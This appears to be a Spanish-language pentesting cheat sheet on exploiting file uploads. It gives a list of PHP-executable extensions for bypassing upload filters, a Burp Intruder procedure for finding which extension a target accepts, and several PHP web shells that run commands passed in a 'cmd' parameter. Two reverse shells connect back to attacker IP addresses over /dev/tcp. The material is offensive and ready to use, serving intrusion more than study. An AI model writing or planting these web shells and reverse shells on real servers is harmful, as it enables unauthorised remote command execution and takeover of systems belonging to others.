

### EXTENSIONES QUE INTERPRETAN PHP
```url
https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology
```

```R
❯ echo '.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module' | tr ',' '\n' | sed 's/\.//g' | sed 's/ //g' > extensionsPHP
```


# IDENTIFICAR CUAL EXTENSION ES VALIDA
#### REQ VICTIMA
```bash
------WebKitFormBoundarytG1Uhhned3dACEkw
Content-Disposition: form-data; name="image"; filename="cmd.php"
Content-Type: application/x-php
<?php
  echo 'Probando';
?>
------WebKitFormBoundarytG1Uhhned3dACEkw--
```

#### BURP INTRUDER
1. Send to intruder >> Set the \$$ in .php
2. Payload >> Load file PHP EXTENSIONS
3. Check the response lenghs


### FUNCIONES DE EJECUCIÓN DE COMANDOS EN PHP
```url
https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720
```

### EJEMPLOS DE REVERSE SHELL CON FUNCIONES
```PHP
# EXEC
<?php echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";?>

#POPEN
<?php echo fread(popen($_GET['cmd'], "r"), 10000);?>

#proc_open
<?php
	$descriptorspec = array(
	   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
	   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
	   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
	);
	$shell = "/bin/bash -c '/bin/bash >& /dev/tcp/10.10.16.7/443 0>&1'";
	$process = proc_open($shell, $descriptorspec, $pipes);
?>
```

<?php shell_exec("bash -c "bash -i >& /dev/tcp/192.168.45.227/443 0>&1"");?>
### PHP INFO
```PHP
<?php phpinfo() ?>
```



